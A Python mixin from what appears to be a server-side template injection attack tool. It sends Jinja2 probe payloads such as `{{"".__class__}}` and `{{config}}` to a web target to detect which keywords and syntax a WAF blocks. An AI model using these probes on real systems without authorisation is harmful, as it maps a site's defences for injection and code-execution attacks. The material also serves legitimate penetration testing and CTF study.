class FiltersMixin:
    """負責 WAF / 黑名單過濾強度偵測。"""

    def detect_filters(self, point, engine):
        f = {}
        tests = [
            ('dot', '{{"".__class__}}', ['class']),
            ('bracket', '{{""["__class__"]}}', ['class']),
            ('os_keyword', '{{os}}', []),
            ('class_keyword', '{{class}}', []),
            ('popen_keyword', '{{popen}}', []),
            ('read_keyword', '{{read}}', []),
            ('request_obj', '{{request}}', ['request']),
            ('config_obj', '{{config}}', ['config']),
            ('lipsum_obj', '{{lipsum}}', ['lipsum']),
            ('url_for_obj', '{{url_for}}', ['url_for']),
        ]
        for key, payload, expect in tests:
            text, status, _ = self.send_to_point(point, payload)
            if key == 'dot':
                f['dot'] = not (status == 200 and any(e in text for e in expect))
                f['underscore'] = f['dot']
            elif key == 'bracket':
                f['bracket'] = not (status == 200 and any(e in text for e in expect))
            elif key in ('os_keyword', 'class_keyword', 'popen_keyword', 'read_keyword'):
                f[key] = status != 200 or 'blocked' in text.lower() or 'waf' in text.lower()
            else:
                f[key] = status != 200 or not any(e.lower() in text.lower() for e in expect)
        self.filters = f
        level = sum(1 for v in f.values() if v)
        return f, level
